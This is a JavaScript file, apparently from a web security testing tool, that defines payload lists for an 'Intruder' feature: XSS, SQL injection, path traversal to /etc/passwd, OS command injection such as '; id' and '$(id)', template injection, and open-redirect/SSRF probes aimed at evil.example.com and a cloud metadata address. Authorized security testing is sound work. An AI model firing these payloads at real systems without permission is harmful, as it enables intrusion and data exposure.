// payloads.js — built-in test payload sets for the Intruder.
// Standard, widely-published security test strings. For authorized testing only.
window.PAYLOADS = {
  xss: {
    label: "XSS / HTML injection",
    list: [
      "<script>alert(1)</script>",
      "\"><script>alert(1)</script>",
      "'><svg/onload=alert(1)>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(1)",
      "\"><img src=x onerror=alert(document.domain)>",
      "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
      "{{7*7}}",
      "';alert(1)//"
    ]
  },
  sqli: {
    label: "SQL injection",
    list: [
      "'", "\"", "')", "';--", "' OR '1'='1", "' OR '1'='1'--",
      "1 OR 1=1", "' AND SLEEP(3)--", "\" OR \"\"=\"", "1' ORDER BY 1--",
      "' UNION SELECT NULL--", "admin'--"
    ]
  },
  traversal: {
    label: "Path traversal / LFI",
    list: [
      "../../../../etc/passwd", "....//....//....//etc/passwd",
      "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00",
      "..\\..\\..\\windows\\win.ini", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "file:///etc/passwd"
    ]
  },
  cmd: {
    label: "OS command injection",
    list: [
      "; id", "| id", "&& id", "`id`", "$(id)", "; sleep 5",
      "| whoami", "\n id", "%0a id"
    ]
  },
  ssti: {
    label: "Server-side template injection",
    list: ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}", "@(7*7)"]
  },
  redirect: {
    label: "Open redirect / SSRF",
    list: [
      "https://evil.example.com", "//evil.example.com", "/\\/evil.example.com",
      "http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
      "http://localhost:80/", "https:evil.example.com"
    ]
  },
  fuzz: {
    label: "Generic fuzz / errors",
    list: [
      "'", "\"", "`", "\\", "%00", "../", "<", ">", "&", "{}", "[]",
      "%27%22%3E", "-1", "0", "99999999999", "true", "null", "${}",
      "A".repeat(2048)
    ]
  }
};
